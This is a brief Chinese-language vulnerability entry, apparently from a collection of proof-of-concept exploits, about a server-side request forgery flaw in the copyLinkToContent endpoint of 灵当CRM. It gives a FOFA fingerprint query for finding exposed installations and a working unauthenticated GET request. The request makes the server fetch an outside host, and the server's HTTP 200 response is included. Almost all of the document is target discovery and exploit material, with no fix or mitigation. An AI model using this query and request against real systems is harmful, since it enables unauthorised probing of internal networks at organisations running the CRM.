## 灵当CRM-copyLinkToContent-SSRF漏洞

## 一、漏洞简介
01漏洞概述
灵当CRM copyLinkToContent 接口存在服务器请求伪造漏洞。因此攻击者可利用该漏洞在未经身份验证的情况下访问某些受限资源.获取内部服务器信息，使系统处于极不安全状态。

## fofa
```
body="crmcommon/js/jquery/jquery-1.10.1.min.js" || body="http://localhost:8088/crm/index.php" && body="ldcrm.base.js" || title="灵当CRM"
```

## POC
```
GET /crm/WeiXinApp/marketing/index.php?module=Articles&action=copyLinkToContent&url=http://bqhgparoph.dgrh3.cn HTTP/1.1
Host:
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9

HTTP/1.1 200 OK
Date: Sun, 04-Jan-2026 07:29:41 GMT
Server: Apache
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, OPTIONS
Access-Control-Allow-Headers: Origin, No-Cache, X-Requested-With, If-Modified-Since, Pragma, Cache-Control, Expires, Content-Type, X-E4M-With
Upgrade: h2,h2c
Connection: Upgrade
Vary: Accept-Encoding
Content-Type: text/html; charset=UTF-8
Content-Length: 16
```
